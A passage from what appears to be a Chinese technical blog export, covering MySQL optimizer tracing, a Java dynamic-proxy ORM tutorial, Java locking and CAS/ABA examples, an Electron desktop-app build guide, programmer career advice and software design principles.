cnt, group_concat(distinct card) gd_cardFROM peopleWHERE age &gt; 10 AND age &gt; -1 AND 1=1 AND age &lt; 99GROUP BY nameHAVING cnt &gt; 1ORDER BY cnt DESC limit 20000;-- 3. 从OPTIMIZER_TRACE表中查看上一个查询的优化过程SELECT * FROM information_schema.OPTIMIZER_TRACE;-- 4. 还要用的话就重复2、3-- ...-- 5. 不用了就关掉SET optimizer_trace=&quot;enabled=off&quot;; 解读 MySQL分为以上几个模块，主要是 server 层和存储引擎层，service 层又分为连接器、分析器、优化器、执行器和查询缓存几个部分。 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223224225226227228229230231232233234235236237238239240241242243244245246247248249250251252253254255256257258259260261262263264265266267268269270271272273274275276277278279280281282283284285286287288&#123; &quot;steps&quot;: [ &#123; &quot;join_preparation&quot;: &#123; &quot;select#&quot;: 1, &quot;steps&quot;: [ &#123; &quot;expanded_query&quot;: &quot;/* select#1 */ select `people`.`name` AS `name`,count(0) AS `cnt`,group_concat(distinct `people`.`card` separator &#x27;,&#x27;) AS `gd_card` from `people` where ((`people`.`age` &gt; 10) and (`people`.`age` &gt; -(1)) and (1 = 1) and (`people`.`age` &lt; 99)) group by `people`.`name` having (`cnt` &gt; 1) order by `cnt` desc limit 20000&quot; &#125; ] &#125; &#125;, &#123; &quot;join_optimization&quot;: &#123; &quot;select#&quot;: 1, &quot;steps&quot;: [ &#123; // 处理搜索条件 &quot;condition_processing&quot;: &#123; &quot;condition&quot;: &quot;WHERE&quot;, // 原始搜索条件 &quot;original_condition&quot;: &quot;((`people`.`age` &gt; 10) and (`people`.`age` &gt; -(1)) and (1 = 1) and (`people`.`age` &lt; 99))&quot;, &quot;steps&quot;: [ &#123; // 等值传递转换 &quot;transformation&quot;: &quot;equality_propagation&quot;, &quot;resulting_condition&quot;: &quot;((`people`.`age` &gt; 10) and (`people`.`age` &gt; -(1)) and (1 = 1) and (`people`.`age` &lt; 99))&quot; &#125;, &#123; // 常量传递转换 &quot;transformation&quot;: &quot;constant_propagation&quot;, &quot;resulting_condition&quot;: &quot;((`people`.`age` &gt; 10) and (`people`.`age` &gt; -(1)) and (1 = 1) and (`people`.`age` &lt; 99))&quot; &#125;, &#123; // 去除没用的条件 &quot;transformation&quot;: &quot;trivial_condition_removal&quot;, &quot;resulting_condition&quot;: &quot;((`people`.`age` &gt; 10) and (`people`.`age` &gt; -(1)) and (`people`.`age` &lt; 99))&quot; &#125; ] &#125; &#125;, &#123; &quot;condition_processing&quot;: &#123; &quot;condition&quot;: &quot;HAVING&quot;, &quot;original_condition&quot;: &quot;(`cnt` &gt; 1)&quot;, &quot;steps&quot;: [ &#123; &quot;transformation&quot;: &quot;constant_propagation&quot;, &quot;resulting_condition&quot;: &quot;(`cnt` &gt; 1)&quot; &#125;, &#123; &quot;transformation&quot;: &quot;trivial_condition_removal&quot;, &quot;resulting_condition&quot;: &quot;(`cnt` &gt; 1)&quot; &#125; ] &#125; &#125;, &#123; // 替换虚拟生成列 &quot;substitute_generated_columns&quot;: &#123;&#125; &#125;, &#123; // 表的依赖信息 &quot;table_dependencies&quot;: [ &#123; &quot;table&quot;: &quot;`people`&quot;, &quot;row_may_be_null&quot;: false, &quot;map_bit&quot;: 0, &quot;depends_on_map_bits&quot;: [] &#125; ] &#125;, &#123; &quot;ref_optimizer_key_uses&quot;: [] &#125;, &#123; // 预估不同单表访问方法的访问成本 &quot;rows_estimation&quot;: [ &#123; &quot;table&quot;: &quot;`people`&quot;, &quot;const_keys_added&quot;: &#123; &quot;keys&quot;: [ &quot;name_age_key&quot; ], &quot;cause&quot;: &quot;group_by&quot; &#125;, &quot;range_analysis&quot;: &#123; // 全表扫描的行数及成本 &quot;table_scan&quot;: &#123; &quot;rows&quot;: 109674, &quot;cost&quot;: 22482 &#125;, // 分析可能使用的索引 &quot;potential_range_indexes&quot;: [ &#123; &quot;index&quot;: &quot;PRIMARY&quot;, &quot;usable&quot;: false, &quot;cause&quot;: &quot;not_applicable&quot; &#125;, &#123; &quot;index&quot;: &quot;card_UNIQUE&quot;, &quot;usable&quot;: false, &quot;cause&quot;: &quot;not_applicable&quot; &#125;, &#123; &quot;index&quot;: &quot;name_age_key&quot;, &quot;usable&quot;: true, &quot;key_parts&quot;: [ &quot;name&quot;, &quot;age&quot;, &quot;id&quot; ] &#125; ], &quot;setup_range_conditions&quot;: [], &quot;group_index_range&quot;: &#123; &quot;chosen&quot;: false, &quot;cause&quot;: &quot;not_applicable_aggregate_function&quot; &#125;, // 分析各种可能使用的索引的成本 &quot;analyzing_range_alternatives&quot;: &#123; &quot;range_scan_alternatives&quot;: [ &#123; &quot;index&quot;: &quot;name_age_key&quot;, &quot;chosen&quot;: false, &quot;cause&quot;: &quot;unknown&quot; &#125; ], &quot;analyzing_roworder_intersect&quot;: &#123; &quot;usable&quot;: false, &quot;cause&quot;: &quot;too_few_roworder_scans&quot; &#125; &#125; &#125; &#125; ] &#125;, &#123; &quot;considered_execution_plans&quot;: [ &#123; &quot;plan_prefix&quot;: [], &quot;table&quot;: &quot;`people`&quot;, &quot;best_access_path&quot;: &#123; &quot;considered_access_paths&quot;: [ &#123; &quot;rows_to_scan&quot;: 109674, &quot;access_type&quot;: &quot;scan&quot;, &quot;resulting_rows&quot;: 4060.8, &quot;cost&quot;: 22480, &quot;chosen&quot;: true &#125; ] &#125;, &quot;condition_filtering_pct&quot;: 100, &quot;rows_for_plan&quot;: 4060.8, &quot;cost_for_plan&quot;: 22480, &quot;chosen&quot;: true &#125; ] &#125;, &#123; // 尝试给查询添加一些其他的查询条件 &quot;attaching_conditions_to_tables&quot;: &#123; &quot;original_condition&quot;: &quot;((`people`.`age` &gt; 10) and (`people`.`age` &gt; -(1)) and (`people`.`age` &lt; 99))&quot;, &quot;attached_conditions_computation&quot;: [], &quot;attached_conditions_summary&quot;: [ &#123; &quot;table&quot;: &quot;`people`&quot;, &quot;attached&quot;: &quot;((`people`.`age` &gt; 10) and (`people`.`age` &gt; -(1)) and (`people`.`age` &lt; 99))&quot; &#125; ] &#125; &#125;, &#123; &quot;clause_processing&quot;: &#123; &quot;clause&quot;: &quot;ORDER BY&quot;, &quot;original_clause&quot;: &quot;`cnt` desc&quot;, &quot;items&quot;: [ &#123; &quot;item&quot;: &quot;count(0)&quot; &#125; ], &quot;resulting_clause_is_simple&quot;: false, &quot;resulting_clause&quot;: &quot;`cnt` desc&quot; &#125; &#125;, &#123; &quot;clause_processing&quot;: &#123; &quot;clause&quot;: &quot;GROUP BY&quot;, &quot;original_clause&quot;: &quot;`people`.`name`&quot;, &quot;items&quot;: [ &#123; &quot;item&quot;: &quot;`people`.`name`&quot; &#125; ], &quot;resulting_clause_is_simple&quot;: true, &quot;resulting_clause&quot;: &quot;`people`.`name`&quot; &#125; &#125;, &#123; &quot;reconsidering_access_paths_for_index_ordering&quot;: &#123; &quot;clause&quot;: &quot;GROUP BY&quot;, &quot;steps&quot;: [], &quot;index_order_summary&quot;: &#123; &quot;table&quot;: &quot;`people`&quot;, &quot;index_provides_order&quot;: true, &quot;order_direction&quot;: &quot;asc&quot;, &quot;index&quot;: &quot;name_age_key&quot;, &quot;plan_changed&quot;: true, &quot;access_type&quot;: &quot;index&quot; &#125; &#125; &#125;, &#123; &quot;refine_plan&quot;: [ &#123; &quot;table&quot;: &quot;`people`&quot; &#125; ] &#125;, &#123; &quot;creating_tmp_table&quot;: &#123; &quot;tmp_table_info&quot;: &#123; &quot;table&quot;: &quot;intermediate_tmp_table&quot;, &quot;row_length&quot;: 130, &quot;key_length&quot;: 0, &quot;unique_constraint&quot;: false, &quot;location&quot;: &quot;memory (heap)&quot;, &quot;row_limit_estimate&quot;: 129055 &#125; &#125; &#125;, &#123; &quot;sort_using_internal_table&quot;: &#123; &quot;condition_for_sort&quot;: &quot;(`cnt` &gt; 1)&quot;, &quot;having_after_sort&quot;: null &#125; &#125; ] &#125; &#125;, &#123; &quot;join_execution&quot;: &#123; &quot;select#&quot;: 1, &quot;steps&quot;: [ &#123; &quot;creating_tmp_table&quot;: &#123; &quot;tmp_table_info&quot;: &#123; &quot;table&quot;: &quot;intermediate_tmp_table&quot;, &quot;row_length&quot;: 84, &quot;key_length&quot;: 0, &quot;unique_constraint&quot;: false, &quot;location&quot;: &quot;disk (InnoDB)&quot;, &quot;record_format&quot;: &quot;packed&quot; &#125; &#125; &#125;, &#123; &quot;filesort_information&quot;: [ &#123; &quot;direction&quot;: &quot;desc&quot;, &quot;table&quot;: &quot;intermediate_tmp_table&quot;, &quot;field&quot;: &quot;cnt&quot; &#125; ], &quot;filesort_priority_queue_optimization&quot;: &#123; &quot;usable&quot;: false, &quot;cause&quot;: &quot;not applicable (no LIMIT)&quot; &#125;, &quot;filesort_execution&quot;: [], &quot;filesort_summary&quot;: &#123; // 排序过程中持有的行数 &quot;rows&quot;: 27045, // 参与排序的行数，InnoDB 返回的行数 &quot;examined_rows&quot;: 34054, // 排序使用的临时文件数量 &quot;number_of_tmp_files&quot;: 24, // 内存排序使用的内存大小 &quot;sort_buffer_size&quot;: 25744, // 排序模式 &quot;sort_mode&quot;: &quot;&lt;sort_key, rowid&gt;&quot; &#125; &#125; ] &#125; &#125; ]&#125; 优化过程大致分为了三个阶段： prepare阶段 optimize阶段 execute阶段 我们所说的基于成本的优化主要集中在optimize阶段，对于单表查询来说，我们主要关注optimize阶段的”rows_estimation”这个过程，这个过程深入分析了对单表查询的各种执行方案的成本；对于多表连接查询来说，我们更多需要关注”considered_execution_plans”这个过程，这个过程里会写明各种不同的连接方式所对应的成本。反正优化器最终会选择成本最低的那种方案来作为最终的执行计划，也就是我们使用EXPLAIN语句所展现出的那种方案。 参考 https://www.cnblogs.com/taosiyu/p/13206378.html","categories":[],"tags":[{"name":"MySQL","slug":"MySQL","permalink":"https://noogel.xyz/tags/MySQL/"}]},{"title":"程序员升级打怪之路","slug":"关于技术/效率/程序员升级打怪之路","date":"2020-05-11T00:00:00.000Z","updated":"2025-07-23T07:30:58.915Z","comments":true,"path":"2020/05/11/1.html","link":"","permalink":"https://noogel.xyz/2020/05/11/1.html","excerpt":"","text":"这个标题看起有点鸡汤文，不过我还是建议对以下总结出的几点做些深入思考，这些会在今后的工作中越来越多的感受到它的作用。 寻找你行业内的专家找到你所属行业内的专家，这些人往往做事高效并且很有才华。你要做的是跟随他们所关注的方向，学习他们做事的方法，思考如何应用到你的工作和生活上。找到他们，和他们去交流思考，提出自己的观点和想法。不要仅仅把眼光放到身边的人身上，这样会局限住你的视野。 每天都写新代码工作重复枯燥？也许有时候我们只是懒得思考，用最顺手的方式把工作做完，容易形成惯性思维。为什么会有很多的复制粘贴？简单的修改来适配当前需求，这里我们更需要的是想想能不能把这段逻辑抽象出来变得更通用，整个模块的设计是否不够合理，多想一想多做一点，下一次再来需求也许可以提升十倍的效率。 底层的原理更重要客观的说，更快进步的方法之一是忽略掉那些并不能提高技能的东西，比如语言语法和配置工具，这些技能属于“知其然”，而你更需要的是“知其所以然”。有一次去医院科室挂号使用的是先到先叫的模式，而在急诊室挂号是按照轻重缓急分成四个等级的，危重病人优先抢救的模式。这不就和操作系统中的任务调度概念是一样的，优先级调度模式，这些底层的概念才是一通百通真正提高帮助你的东西。我在尝试去找行业经典论文看。 学会调研作为程序员会比较容易脑子一热，有一个想法很容易趁热着急写代码，但往往缺乏思考写出来的代码不能尽如人意。这时候你更需要的是慢下来，好好思考一下，也许这些别人已经做过，有更好的方案，看看别人是如何做的。先调研再实施，这样会彻底改变你解决问题的思路。 学好英语真的是这样，如果你英语不好，那么会比别人走更多的弯路，就像走在密林深处看不清路一样。不得不承认很多优秀框架的官方文档还是英文为主，如果再经过翻译里面的很多语义语境会丢失，在项目的社区中，你还能与作者们去交流你学习中遇到的问题。 如何去做说了这么多，看着就好像道理我都懂，但是我不知道怎么做。我这里先总结几个点，也是自己在不断尝试学习的方法。 看行业经典论文，比如 mapreduce、raft 这些都是一通百通的底层概念。 研究优秀框架的源代码，理解核心原理，尝试造轮子。 每天学英语，尝试在开源社区与作者们进行互动。 找到一两位行业专家，向他们学习和请教问题。 坚持以上几点。 end.","categories":[],"tags":[{"name":"效率","slug":"效率","permalink":"https://noogel.xyz/tags/%E6%95%88%E7%8E%87/"}]},{"title":"Java 动态代理实现 ORM","slug":"关于技术/程序语言/Java动态代理实现ORM","date":"2020-04-29T00:00:00.000Z","updated":"2025-07-23T07:30:58.917Z","comments":true,"path":"2020/04/29/1.html","link":"","permalink":"https://noogel.xyz/2020/04/29/1.html","excerpt":"","text":"ORM（Object&#x2F;Relational Mapper），即“对象-关系型数据映射组件”。对于O&#x2F;R，即 Object（对象）和Relational（关系型数据），表示必须同时使用面向对象和关系型数据进行开发。本文简述通过 Java 动态代理机制实现关系数据与 POJO 对象的映射。 代理静态代理静态代理其实就是指设计模式中的代理模式。代理模式为其他对象提供一种代理以控制对这个对象的访问。 静态代理模式在增强现有的接口业务功能方面有很大的优点，但是大量使用这种静态代理，会使我们系统内的类的规模增大，并且不易维护。 动态代理为了解决静态代理的问题，引入动态代理的概念，在编译时或者运行时，可以在需要代理的地方动态生成代理，减轻代理类和类在系统中冗余的问题。 Java 动态代理基于经典代理模式，引入了一个 InvocationHandler，InvocationHandler 负责统一管理所有的方法调用。 InvocationHandlerInvocationHandler 接口定义： 1234public interface InvocationHandler &#123; public Object invoke(Object proxy, Method method, Object[] args) throws Throwable;&#125; 每一个动态代理类都必须要实现 InvocationHandler 这个接口，通过代理类的实例调用一个方法时，这个方法的调用就会被转发为由 InvocationHandler 这个接口的 invoke 方法来进行调用。 ProxyProxy 这个类的作用就是用来动态创建一个代理对象的类，它提供了许多的方法，但是我们用的最多的就是 newProxyInstance 这个方法，可以获得一个动态的代理对象： 1public static Object newProxyInstance(ClassLoader loader, Class&lt;?&gt;[] interfaces, InvocationHandler h) throws IllegalArgumentException 实现参照 mybaits 的用法实现基本的映射能力。 注解首先定义了三个注解，一个作用在类上 DaoMapper 作用在类上标记这是一个映射类，然后定义注解 Selector 作用在方法上标记查询作用，定义注解 Param 作用在参数上为预编译位的映射。 1234567891011121314151617181920@Documented@Target(ElementType.TYPE)@Retention(RetentionPolicy.RUNTIME)public @interface DaoMapper &#123;&#125;@Documented@Target(ElementType.METHOD)@Retention(RetentionPolicy.RUNTIME)public @interface Selector &#123; String value();&#125;@Documented@Target(ElementType.PARAMETER)@Retention(RetentionPolicy.RUNTIME)public @interface Param &#123; String value();&#125; 定义一个实体类，与数据库的表字段映射上。增强 feature 可以自动做驼峰转换，这里没有实现。 123456789@Datapublic class BaseLineModel &#123; public static final String TABLE = &quot;baseline&quot;; private Integer id; private String report_name; private Integer report_period; private LocalDateTime creation_date;&#125; 定义dao层接口，加上注解 1234567@DaoMapperpublic interface BaseLineDao &#123; @Selector(&quot;select * from &quot;+ BaseLineModel.TABLE +&quot; where report_name = #&#123;reportName&#125;&quot;) BaseLineModel select(@Param(&quot;reportName&quot;) String report_name);&#125; JDBC OP做到一个很简单的 JDBC 操作工具类，字段映射处理也写到了这里。实现了查询操作，将入参 sql template 以及参数按顺序传入，生成 prepareStatement 后执行，再将返回结果映射到 model 对象。这里的连接池管理、自动重连、配置管理等增强 features 非重点，不做实现。 123456789101112131415161718192021222324/** * 查询 * @param clazz model类 * @param sql * @param params * @param &lt;T&gt; * @return */public &lt;T&gt; T query(Class&lt;T&gt; clazz, String sql, Object... params) throws SQLException, IllegalAccessException, NoSuchMethodException, InvocationTargetException, InstantiationException &#123; Object model = clazz.newInstance(); try (Connection conn = DriverManager.getConnection(&quot;jdbc:mysql://localhost:3306/cat&quot;, &quot;root&quot;, &quot;123456&quot;)) &#123; PreparedStatement statement = conn.prepareStatement(sql); int flag = 1; for (Object obj : params) &#123; setValue(statement, flag, obj); flag++; &#125; ResultSet resultSet = statement.executeQuery(); resultSet.afterLast(); resultSet.previous(); fullRes(resultSet, model); &#125; return (T) model;&#125; 映射函数，通过自动寻找 setter 方法填充结果，这里只实现了三种字段。 1234567891011121314151617181920212223242526private static void fullRes(ResultSet resultSet, Object model) throws SQLException, InvocationTargetException, IllegalAccessException, NoSuchMethodException &#123; Field[] declaredFields = model.getClass().getDeclaredFields(); for (Field field : declaredFields) &#123; String fieldName = field.getName(); if (fieldName.toUpperCase().equals(fieldName)) &#123; continue; &#125; String setFuncName = &quot;set&quot; + fieldName.substring(0, 1).toUpperCase() + fieldName.substring(1); String fieldType = field.getGenericType().toString(); Object object = resultSet.getObject(fieldName); if (fieldType.equals(&quot;class java.lang.String&quot;)) &#123; Method m = model.getClass().getMethod(setFuncName, String.class); m.invoke(model, object); &#125; else if (fieldType.equals(&quot;class java.lang.Integer&quot;)) &#123; Method m = model.getClass().getMethod(setFuncName, Integer.class); m.invoke(model, object); &#125; else if (fieldType.equals(&quot;class java.time.LocalDateTime&quot;)) &#123; Method m = model.getClass().getMethod(setFuncName, LocalDateTime.class); if (object instanceof Timestamp) &#123; object = ((Timestamp) object).toLocalDateTime(); &#125; m.invoke(model, object); &#125; &#125;&#125; 动态代理部分定义一个 MapperMethod 类，实例化的时候提取接口方法的注解信息解析成 JDBC 需要的参数以及记录接口方法的返回对象， execute 执行。 1234567891011121314151617181920212223242526272829303132333435363738394041public class MapperMethod&lt;T&gt; &#123; private String sql; private Class&lt;?&gt; resType; private int[] paramsIndex; public MapperMethod(Method method) &#123; this.resType = method.getReturnType(); String sourceSql = method.getAnnotation(Selector.class).value(); Parameter[] parameters = method.getParameters(); int flag = 0; this.paramsIndex = new int[parameters.length]; for (Parameter parameter: parameters) &#123; String paramName = parameter.getAnnotation(Param.class).value(); String paramFullName = String.format(&quot;#&#123;%s&#125;&quot;, paramName); int indexOf = sourceSql.indexOf(paramFullName); this.paramsIndex[flag] = indexOf; flag++; this.sql = sourceSql.replace(paramFullName, &quot;?&quot;); &#125; &#125; public Object execute(Object[] objects) &#123; JdbcUtil jdbcUtil = new JdbcUtil(); try &#123; return jdbcUtil.query(this.resType, this.sql, objects); &#125; catch (SQLException e) &#123; e.printStackTrace(); &#125; catch (IllegalAccessException e) &#123; e.printStackTrace(); &#125; catch (NoSuchMethodException e) &#123; e.printStackTrace(); &#125; catch (InvocationTargetException e) &#123; e.printStackTrace(); &#125; catch (InstantiationException e) &#123; e.printStackTrace(); &#125; return null; &#125;&#125; 定义动态代理类，在实例化的时候记录代理接口，以及代理方法类缓存，调用接口的时候会被动态代理到 invoke 函数执行，然后交由 MapperMethod 代理方法实例执行。 1234567891011121314151617181920212223242526272829303132import java.lang.reflect.InvocationHandler;import java.lang.reflect.Method;import java.util.Map;import java.util.Objects;public class MapperProxy&lt;T&gt; implements InvocationHandler &#123; private final Class&lt;T&gt; mapperInterface; private final Map&lt;Method, MapperMethod&gt; methodCache; public MapperProxy(Class&lt;T&gt; mapperInterface, Map&lt;Method, MapperMethod&gt; methodCache) &#123; this.mapperInterface = mapperInterface; this.methodCache = methodCache; &#125; @Override public Object invoke(Object o, Method method, Object[] objects) throws Throwable &#123; MapperMethod mapperMethod = cachedMapperMethod(method); return mapperMethod.execute(objects); &#125; private MapperMethod cachedMapperMethod(Method method) &#123; MapperMethod mapperMethod = methodCache.get(method); if (Objects.isNull(mapperMethod)) &#123; mapperMethod = new MapperMethod(method); methodCache.put(method, mapperMethod); &#125; return mapperMethod; &#125;&#125; 最后代理工厂类，接收被 DaoMapper 作用的接口，并通过 newInstance 方法创建代理类实例。 12345678910111213141516171819public class MapperProxyFactory&lt;T&gt; &#123; private final Class&lt;T&gt; mapperInterface; private Map&lt;Method, MapperMethod&gt; methodCache = new ConcurrentHashMap&lt;&gt;(); public MapperProxyFactory(Class&lt;T&gt; mapperInterface) &#123; if (Objects.isNull(mapperInterface.getAnnotation(DaoMapper.class))) &#123; throw new RuntimeException(&quot;缺少注解 DaoMapper&quot;); &#125; this.mapperInterface = mapperInterface; &#125; public T newInstance() &#123; final MapperProxy&lt;T&gt; mapperProxy = new MapperProxy&lt;&gt;(mapperInterface, methodCache); return (T) Proxy.newProxyInstance(mapperInterface.getClassLoader(), new Class[]&#123;mapperInterface&#125;, mapperProxy); &#125;&#125; 执行，创建一个代理工厂，然后创建 BaseLineDao 的代理对象， 调用 select 方法，实际上调用到代理对象的 invoke 方法，然后交由 mapperMethod.execute 方法执行： 123456public static void main(String[] args) &#123; MapperProxyFactory mapperProxyFactory = new MapperProxyFactory(BaseLineDao.class); BaseLineDao baseLineDao = (BaseLineDao) mapperProxyFactory.newInstance(); BaseLineModel test1 = baseLineDao.select(&quot;TEST1&quot;); System.out.println(test1);&#125; 扩展TODO： Java动态代理与 cglib 动态代理的异同点。 动态代理的实现原理。 总结通过这个个简单的实践，了解了 Java 动态代理的使用方法以及对象关系数据的映射处理。 参考 https://zhuanlan.zhihu.com/p/60805342https://www.zhihu.com/question/20794107/answer/658139129","categories":[],"tags":[{"name":"编程语言","slug":"编程语言","permalink":"https://noogel.xyz/tags/%E7%BC%96%E7%A8%8B%E8%AF%AD%E8%A8%80/"}]},{"title":"Java 锁基础概念","slug":"关于技术/程序语言/Java锁基础概念","date":"2020-04-26T00:00:00.000Z","updated":"2025-07-23T07:30:58.917Z","comments":true,"path":"2020/04/26/1.html","link":"","permalink":"https://noogel.xyz/2020/04/26/1.html","excerpt":"","text":"锁解决的问题是并发操作引起的脏读、数据不一致问题。 基本原理volatile在Java中允许线程访问共享变量，为了确保共享变量能被准确和一致的更新，线程应该确保使用排它锁来单独获得这个变量，Java中提供了 volatile，使之在多处理器开发中保证变量的可见性，当一个线程改变了共享变量，另一个线程能够及时读到这个修改的值。恰当的使用它会比 synchronized 成本更低，因为不会引起上下文的切换和调度。 synchronized通过锁机制实现同步，在Java中每一个对象都可以作为锁，有以下三种形式： 对于普通同步方法，锁的是当前实例对象。 对于静态同步方法，所得是当前类 class 对象。 对于同步方法块，锁的是括号内指定的对象。 为了减少获得锁和释放锁带来的性能消耗，Java SE 1.6 引入了偏向锁和轻量级锁。偏向锁 的核心思想是：如果一个线程获得了锁，就进入偏向模式，当这个线程再次请求锁时，如果没有其它线程获取过该锁，无需再做任何同步操作，可以节省大量锁申请的操作，来提高性能。如果偏向锁获取失败，会通过 轻量级锁 的方式获取，如果获取成功则进入临界区，如果失败则表示有其它线程争夺到锁，当前线程锁请求会膨胀为 重量级锁 。 锁粗化 是指在遇到一连串连续的对同一个锁不断的进行请求和释放的操作时，会把所有的锁操作整合成对锁的一次请求，减少锁请求的同步次数。 锁消除 是指在编译期，通过对上下文的扫描，去除不可能存在共享资源竞争的锁。 自旋锁 是指在锁膨胀后，避免线程真正的在操作系统层面被挂起，通过对线程做几个空循环，以期望在这之后能获取到锁，顺利的进入临界区，如果还获取不到，则会真正被操作系统层面挂起。 CAS指的是比较并交换，它是一个原子操作，比较一个内存位置的值并且只有相等时修改这个内存位置的值并更新值，保证新的值总是基于最新的信息计算的。在 JVM 中 CAS 操作是利用处理器提供的 CMPXCHS 指令实现。是实现我们平时所说的自旋锁或乐观锁的核心操作。 优点是竞争小的时候使用系统开销小；对应缺点是循环时间长开销大、ABA问题、只能保证一个变量的原子操作。 ABA 问题问题产生原因是两个线程处理的时间差导致，具体如下图： 解决 ABA 问题可以增加一个版本号，在每次修改值的时候增加一个版本号。 产生： 1234567891011121314151617private static AtomicReference&lt;Integer&gt; atomicReference = new AtomicReference&lt;Integer&gt;(100);public static void main(String[] args) &#123; new Thread(() -&gt; &#123; atomicReference.compareAndSet(100, 101); atomicReference.compareAndSet(101, 100); &#125;,&quot;t1&quot;).start(); new Thread(() -&gt; &#123; try &#123; TimeUnit.SECONDS.sleep(1); &#125; catch (InterruptedException e) &#123; e.printStackTrace(); &#125; System.out.println(atomicReference.compareAndSet(100, 2019) + &quot;\\t修改后的值:&quot; + atomicReference.get()); &#125;,&quot;t2&quot;).start();&#125; 解决： 123456789101112131415161718192021222324252627282930private static AtomicStampedReference&lt;Integer&gt; atomicStampedReference = new AtomicStampedReference&lt;Integer&gt;(100,1);public static void main(String[] args) &#123; new Thread(() -&gt; &#123; System.out.println(&quot;t1拿到的初始版本号:&quot; + atomicStampedReference.getStamp()); //睡眠1秒，是为了让t2线程也拿到同样的初始版本号 try &#123; TimeUnit.SECONDS.sleep(1); &#125; catch (InterruptedException e) &#123; e.printStackTrace(); &#125; atomicStampedReference.compareAndSet(100, 101,atomicStampedReference.getStamp(),atomicStampedReference.getStamp()+1); atomicStampedReference.compareAndSet(101, 100,atomicStampedReference.getStamp(),atomicStampedReference.getStamp()+1); &#125;,&quot;t1&quot;).start(); new Thread(() -&gt; &#123; int stamp = atomicStampedReference.getStamp(); System.out.println(&quot;t2拿到的初始版本号:&quot; + stamp); //睡眠3秒，是为了让t1线程完成ABA操作 try &#123; TimeUnit.SECONDS.sleep(3); &#125; catch (InterruptedException e) &#123; e.printStackTrace(); &#125; System.out.println(&quot;最新版本号:&quot; + atomicStampedReference.getStamp()); System.out.println(atomicStampedReference.compareAndSet(100, 2019,stamp,atomicStampedReference.getStamp() + 1) + &quot;\\t当前 值:&quot; + atomicStampedReference.getReference()); &#125;,&quot;t2&quot;).start();&#125;","categories":[],"tags":[{"name":"编程语言","slug":"编程语言","permalink":"https://noogel.xyz/tags/%E7%BC%96%E7%A8%8B%E8%AF%AD%E8%A8%80/"}]},{"title":"基于 Electron 和 FeHelper 的桌面 APP","slug":"关于技术/效率/基于Electron和FeHelper的桌面APP","date":"2020-04-05T00:00:00.000Z","updated":"2025-07-23T07:30:58.915Z","comments":true,"path":"2020/04/05/1.html","link":"","permalink":"https://noogel.xyz/2020/04/05/1.html","excerpt":"","text":"在 Chrome 上有个很好用的插件 FeHelper，应该是每个开发人员都在使用的，功能很全面。想着能不能搞个桌面版的，这样多屏环境下可以不用在众多 tab 页中找功能了。 桌面版实现，界面比较丑陋，不过用起来方便就行。这样可以在多屏环境下一个屏用来开啊，另一个屏可以观察辅助信息和使用小工具。 了解到 electron 是一个开源跨平台框架，可以使用 nodejs 做后端和 chromium 做前端开发。像 atom 和 vs code 使用这个框架开发的。觉得还是和方便的，主要是跨平台。而这个插件也是基于 nodejs 开发的，应该可以迁移过来。然后按照官方文档开发，通过 iframe load 不同页面。 项目地址：https://github.com/noogel/xyzToolbox Mac 安装包下载地址:https://pan.baidu.com/s/1SYjVX2Dhz6TTbaif1Bk8RA 密码:64oo 拉取项目和子模块 123git clone https://xxx.gitgit submodule initgit submodule update 打包命令 123456789101112131415161718环境安装npm install# Linux打包成AppImage文件# 在Linux环境上执行node_modules/.bin/electron-builder -l AppImage# Windows打包成exe安装文件# 在Windows环境下执行node_modules/.bin/electron-builder -w nsisnode_modules/.bin/electron-builder -w --ia32 nsis# 如果在非Windows上打包win程序，也可以借助docker 如下# docker run --rm -it -v $&#123;PWD&#125;:/project electronuserland/builder:wine sh -c &quot;node_modules/.bin/electron-builder -w nsis&quot;# Mac打包成dmg文件# 在Mac环境下执行node_modules/.bin/electron-builder -m dmg 打包参考链接 https://qii404.me/2019/07/10/electron.html","categories":[],"tags":[{"name":"效率","slug":"效率","permalink":"https://noogel.xyz/tags/%E6%95%88%E7%8E%87/"}]},{"title":"设计模式与设计原则","slug":"关于技术/理论知识/设计模式与设计原则","date":"2020-03-05T00:00:00.000Z","updated":"2025-07-23T07:30:58.917Z","comments":true,"path":"2020/03/05/1.html","link":"","permalink":"https://noogel.xyz/2020/03/05/1.html","excerpt":"","text":"设计原则如果把设计模式理解为优秀软件系统模块设计的最小抽象，那么设计原则就是这些抽象的指导思想。目的是设计一个易于扩展和维护的系统。设计模式的六大原则有： Single Responsibility Principle：单一职责原则 Open Closed Principle：开闭原则 Liskov Substitution Principle：里氏替换原则 Law of Demeter：迪米特法则 Interface Segregation Principle：接口隔离原则 Dependence Inversion Principle：依赖倒置原则 单一职责原则应该有且只有一个原因引起类的变化，一个类只负责一个职责。一个功能应该要划分成多少个职责类去实现，并没有明显的限定。举例说明对于用户管理，用户信息管理和用户行为管理可以做初步拆分，用户信息管理又可以拆分成普通信息维护和敏感信息的维护。又比如用户发生一笔支付行为可以初步拆分为交易信息管理和支付信息管理。职责划分的粗细的影响因素有对于业务理解程度、项目开发阶段等，过粗会造成一个处理类包含太多职责，过细又会增加开发维护成本。单一职责是“高内聚低耦合”设计的一种实现形式，单一职责即为同一职责内部的内聚性，降低不同职责之间的耦合性。 里氏替换原则描述继承关系，子类全部实现或继承父类方法，子类可以扩展父类方法实现，将子类替换父类不会产生异常。在重构角度来说如果多个子类拥有相同的行为，可以将相同行为提取到父类实现，子类调用扩展父类实现。在开发上基于“组合大于继承”的原则，通过定义实现接口的形成被其它类调用。违反这个原则不一定会产生严重后果，但是会对后面的开发维护造成困难。 开闭原则描述的是对于需求产生变化后，软件实体部分应该进行扩展开发，避免修改。通过扩展实体行为来响应需求变化，而不是通过修改现有软件代码。 迪米特法则描述的是一个对象应该进行减少对于其它对象的理解。通过封装我们可以屏蔽类内部逻辑，只提供足够用且少量的方法来给外部使用，降低对象之间的耦合性。当一个接口或者一个对象被公开，意味着后面我们进行开发和维护的时候很难再将这个对象收回，重构内部逻辑时也会更加困难。 接口隔离原则描述的是建立单一的接口，不要建立庞大臃肿的接口，尽量细化接口，接口中的方法尽量行为统一，避免臃肿。对于支付接口来说，定义类通用支付方法，对于获取分期支付信息也属于支付行为的一个环节，但不是所有实体类必须要实现的，可以拆分出来。 